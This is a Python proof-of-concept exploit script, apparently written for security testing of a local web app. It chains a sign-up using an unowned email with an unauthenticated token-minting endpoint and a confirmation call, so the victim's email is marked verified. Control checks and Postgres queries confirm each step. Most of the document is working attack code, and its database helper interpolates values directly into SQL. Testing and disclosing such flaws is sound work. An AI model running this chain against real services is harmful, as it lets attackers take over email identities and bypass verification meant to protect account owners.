#!/usr/bin/env python3
"""P-01 (server): unauthenticated email-verification token minting.
Chain: sign up with an email the attacker does NOT own -> mint a REAL
verification token for it via GET /api/v1/auth/getEmailVerificationToken
with NO authentication -> confirm from the attacker's own session.
Controls: decoy token for non-existent email must NOT confirm; a wrong
token must NOT confirm; victim email state checked in Postgres.
"""
import json, sys, urllib.request, urllib.error, http.cookiejar

BASE = "http://localhost:3004"
VICTIM_EMAIL = "victim-not-owned@example-corp.com"
GHOST_EMAIL = "ghost-never-registered@example-corp.com"
ATTACKER_PW = "AttackerChosen1!"

def opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def call(op, method, path, body=None, csrf=None):
    headers = {"Content-Type": "application/json"}
    if csrf: headers["x-csrf-token"] = csrf
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with op.open(req) as r: return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def get_csrf(op):
    return json.loads(op.open(BASE + "/api/v1/auth/csrf").read())["csrf"]

def waiting_flag(email):
    import subprocess
    out = subprocess.run(["psql", "-h", "localhost", "-U", "wab", "-d", "wab", "-Atc",
                          f"select \"waitingEmailVerification\" from \"user\" where email='{email}'"],
                         env={"PATH": "/usr/bin:/bin", "PGPASSWORD": "SEKRET"},
                         capture_output=True, text=True)
    return out.stdout.strip()

results = []
anon = opener()

# 1) ATTACKER signs up with an email they do not own (no mailbox access).
op = opener(); csrf = get_csrf(op)
st, r = call(op, "POST", "/api/v1/auth/sign-up",
             {"email": VICTIM_EMAIL, "password": ATTACKER_PW, "firstName": "Vic", "lastName": "Tim"}, csrf)
print(f"[1] sign-up victim email -> {st}: {json.dumps(r)[:160]}")
results.append(("signup-created-unverified-account", st == 200 and r.get("status") is True))
print(f"    DB waitingEmailVerification after signup: {waiting_flag(VICTIM_EMAIL)}")

# 2) CONTROL A: decoy token for a non-existent email (endpoint's anti-enumeration decoy)
st, r = call(anon, "GET", "/api/v1/auth/getEmailVerificationToken", {"email": GHOST_EMAIL})
decoy = r.get("token")
print(f"[2] mint token for NON-EXISTENT email (anonymous) -> {st}, token issued: {bool(decoy)}")
csrf_a = get_csrf(op)
st, r = call(op, "POST", "/api/v1/auth/confirmEmail", {"email": GHOST_EMAIL, "token": decoy}, csrf_a)
print(f"    confirm with decoy -> {st}: {json.dumps(r)[:120]} (must fail)")
results.append(("control-decoy-token-rejected", r.get("status") is not True))

# 3) CONTROL B: wrong token for the victim email must fail
st, r = call(op, "POST", "/api/v1/auth/confirmEmail", {"email": VICTIM_EMAIL, "token": "wrong-token-123"}, csrf_a)
print(f"[3] confirm victim with WRONG token -> {st}: {json.dumps(r)[:120]} (must fail)")
results.append(("control-wrong-token-rejected", r.get("status") is not True))
print(f"    DB waitingEmailVerification still: {waiting_flag(VICTIM_EMAIL)}")

# 4) ATTACK: mint a REAL token for the victim email — completely unauthenticated
st, r = call(anon, "GET", "/api/v1/auth/getEmailVerificationToken", {"email": VICTIM_EMAIL})
real_token = r.get("token")
print(f"[4] mint token for VICTIM email (anonymous, no session) -> {st}, token: {str(real_token)[:12]}...")
results.append(("anon-mint-returns-token", st == 200 and bool(real_token)))

# 5) ATTACK: confirm from the attacker's own session (the session that signed up)
st, r = call(op, "POST", "/api/v1/auth/confirmEmail", {"email": VICTIM_EMAIL, "token": real_token}, csrf_a)
print(f"[5] confirm victim email with minted token -> {st}: {json.dumps(r)[:160]}")
results.append(("confirm-with-minted-token-succeeds", r.get("status") is True))
flag = waiting_flag(VICTIM_EMAIL)
print(f"    DB waitingEmailVerification after attack: {flag} (expect 'f')")
results.append(("db-verified-flag-cleared", flag == "f"))

# 6) Post-attack: the verified account is fully usable (auth/self no longer gated)
st, r = call(op, "GET", "/api/v1/auth/self")
print(f"[6] GET /auth/self after verification -> {st}, email={r.get('user', {}).get('email')}")
results.append(("account-fully-usable", st == 200 and r.get("user", {}).get("email") == VICTIM_EMAIL))

print("\n== SUMMARY ==")
ok = True
for name, passed in results:
    print(f"  {'PASS' if passed else 'FAIL'}  {name}"); ok = ok and passed
sys.exit(0 if ok else 1)
